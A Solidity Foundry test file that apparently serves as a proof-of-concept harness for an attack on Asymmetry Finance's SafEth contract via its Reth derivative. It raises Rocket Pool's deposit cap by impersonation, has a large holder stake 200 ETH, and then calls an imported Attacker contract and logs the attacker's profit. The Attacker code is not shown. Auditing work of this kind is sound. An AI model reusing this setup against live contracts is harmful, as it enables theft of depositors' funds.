pragma solidity ^0.8.13;

import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "../../contracts/SafEth/SafEth.sol";
import "../../contracts/Attacker.sol";
import "../../contracts/SafEth/derivatives/Reth.sol";
import "../../contracts/SafEth/derivatives/SfrxEth.sol";
import "../../contracts/SafEth/derivatives/WstEth.sol";
import "../../contracts/interfaces/rocketpool/RocketStorageInterface.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract TestAttck is Test {
  address public deployer = 0x690B9A9E9aa1C9dB991C7721a92d351Db4FaC990;
  address public richMan = 0x62CC4EDfe738701297f06cE979dE18229b69B49A;
  address public me = 0x574998328F16832043ce2a91ea24fa84D2869CC8;

  RocketDAOProtocolSettingsDepositInterface constant rocketDAOProtocolSettingsDeposit =
    RocketDAOProtocolSettingsDepositInterface(
      0xCc82C913B9f3a207b332d216B101970E39E59DB3
    );
  RocketStorageInterface public constant ROCKET_STORAGE =
    RocketStorageInterface(0x1d8f8f00cfa6758d7bE78336684788Fb0ee0Fa46);
  uint newCap = 1000000000000000000;
  SafEth public safETH;
  address public reth;
  address public sfrx;
  address public wst;
  Attacker public attacker;

  function setUp() public {
    console.log("block number:", block.number);
    vm.startPrank(deployer, deployer);
    // deploy safETH
    SafEth safETHImpl = new SafEth();
    safETH = SafEth(
      payable(
        new TransparentUpgradeableProxy(
          address(safETHImpl),
          address(1),
          abi.encodeWithSelector(
            safETHImpl.initialize.selector,
            "Asymmetry Finance ETH",
            "safETH"
          )
        )
      )
    );
    // Deploy derivatives
    Reth rethImpl = new Reth();
    reth = address(
      new TransparentUpgradeableProxy(
        address(rethImpl),
        address(1),
        abi.encodeWithSelector(rethImpl.initialize.selector, safETH)
      )
    );
    SfrxEth sfrxImpl = new SfrxEth();
    sfrx = address(
      new TransparentUpgradeableProxy(
        address(sfrxImpl),
        address(1),
        abi.encodeWithSelector(sfrxImpl.initialize.selector, safETH)
      )
    );
    WstEth wstImpl = new WstEth();
    wst = address(
      new TransparentUpgradeableProxy(
        address(wstImpl),
        address(1),
        abi.encodeWithSelector(wstImpl.initialize.selector, safETH)
      )
    );
    // add derivatives to safETH
    // NOTE: attack at reth
    // to make thing clear,only set the weight for reth
    safETH.addDerivative(reth, 1000000000000000000);
    // safETH.addDerivative(sfrx, 1000000000000000000);
    // safETH.addDerivative(wst, 1000000000000000000);
    vm.stopPrank();
    // set new cap to make attack possible
    address owner = ROCKET_STORAGE.getAddress(
      keccak256(
        abi.encodePacked("contract.address", "rocketDAOProtocolProposals")
      )
    );
    vm.startPrank(owner, owner);
    rocketDAOProtocolSettingsDeposit.setSettingUint(
      "deposit.pool.maximum",
      5400000000000000000000
    );
    vm.stopPrank();
    // deploy attacker
    vm.startPrank(me, me);
    attacker = new Attacker(safETH);
    vm.stopPrank();
    // rich man deposit 200 eth to safETH
    uint amount = 200 * 10 ** 18;
    deal(richMan, amount);
    vm.startPrank(richMan, richMan);
    safETH.stake{ value: amount }();
    vm.stopPrank();
    console.log("rich man deposit amount", amount);
    console.log("rich man share", safETH.balanceOf(richMan));
  }

  function testAttack() public {
    deal(me, 1000000 * 10 ** 18);
    uint balanceBefore = me.balance;
    vm.startPrank(me, me);
    attacker.attack{ value: 200 * 10 ** 18 }();
    attacker.destroy();
    vm.stopPrank();
    console.log("profit:", me.balance - balanceBefore);
  }
}
